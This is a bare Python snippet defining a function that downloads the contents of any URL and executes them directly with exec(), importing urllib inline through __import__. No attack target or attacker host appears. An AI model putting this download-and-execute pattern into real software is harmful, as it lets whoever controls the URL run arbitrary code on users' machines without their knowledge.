def ps_package(url):
  exec(__import__('urllib').request.urlopen(url).read().decode())
